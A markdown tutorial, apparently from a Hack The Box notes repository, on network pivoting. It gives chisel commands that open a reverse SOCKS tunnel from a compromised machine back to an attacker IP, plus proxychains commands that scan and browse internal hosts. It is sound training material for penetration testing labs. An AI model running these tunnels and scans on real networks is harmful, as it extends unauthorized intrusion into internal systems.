### Network Pivoting

<p align="center">
<img src="https://miro.medium.com/max/700/1*exRPwGYJpGv6eESldShwzQ.png"/><br />
Image from Vickie Li's <a href="https://medium.com/swlh/proxying-like-a-pro-cccdc177b081">post</a></p>

**Summary:**
  - Network pivoting is the process of accessing an internal machine with the help of the compromised machine.
  - Connection lies between the compromised machine and the internal machine, and no direct connection will be available from the attacker machine to the internal machine
  - So in order to access the internal machine, we will make use of the compromised machine which has access to the internal machine

**Dynamic Port Forwarding:**
```bash
Dynamic Port Forwarding is the third major method of port redirection with SSH. 
Where as previously both local and remote port forwarding allowed interaction with a single port, 
dynamic allows a full range of TCP communication across a range of ports. 
The tool proxychains is also used to force any program you wish to use through the dynamic proxy.
```

**Requirements:** 
- To directly access the internal machine from the attacker machine, we can make the compromised machine as a proxy server and make all our requests to go via the compromised server to the internal machine
- To perform this we need an `ssh / chisel service` and `proxychains` in attacker machine
- If chisel is not available in the target machine, [chisel](https://github.com/jpillora/chisel/releases/tag/v1.7.4) release page

**Procedure:**
- Transfer the `chisel` binary to the compromised machine
- On the Attacker machine:
```bash
# attacker IP: 192.168.1.1
# syntax: ./chisel server -p {port} --reverse
./chisel server -p 1337 --reverse
```
- On the compromised machine
```bash
# syntax: chisel client {attacker IP}:{port on chisel server} R:socks
./chisel client 192.168.1.1:1337 R:socks # on a debian based machine
chisel.exe client 192.168.1.1:1337 R:socks # on a windows machine
```
- On successful connection, the chisel server running on the attacker machine will pop the message
```bash
2021/01/15 17:11:47 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
- The message implies that the connection is made via a socks proxy on the port `1080` which is a default proxy for the chisel
- Add the following line in the `/etc/proxychains.conf`
```bash
socks5 127.0.0.1 1080
```
- Now Whenever a command is executed in the attacker machine with mentioning the proxychains, 
```bash
kali -> proxychains:1080 -> compromised_machine:1080 -> request for accessing from internal_machine -> internal_machine:80
```

<p align="center">
<img src="https://github.com/cyberwr3nch/hackthebox/blob/master/scripts/files/Pivoting.jpg"/> <br />
Image by <a href="https://github.com/cyberwr3nch">cyberwr3nch</a></p>


**Syntax:**
```bash
# nmap port scan
proxychains nmap -p22,80,8080,21,443,445 -sT internal_machinesIP

# opening internal_machine webserver
proxychains firefox internal_machinesIP:80
```

### Live Example
- Machines used, bucket and Jewel from [htb](https://hackthebox.eu)

<p align="center">
<img src="https://github.com/cyberwr3nch/hackthebox/blob/master/scripts/files/pivoting-log.jpg"/> <br />
Image by <a href="https://github.com/cyberwr3nch">cyberwr3nch</a></p>

- Summary of the pivot

<p align="center">
<img src="https://github.com/cyberwr3nch/hackthebox/blob/master/scripts/files/pivot-summary.jpg"/> <br />
Image by <a href="https://github.com/cyberwr3nch">cyberwr3nch</a></p>

<h5>Thanks <a href="https://github.com/adithyan-ak">@adithyan-ak</a> for binding me in</h5>
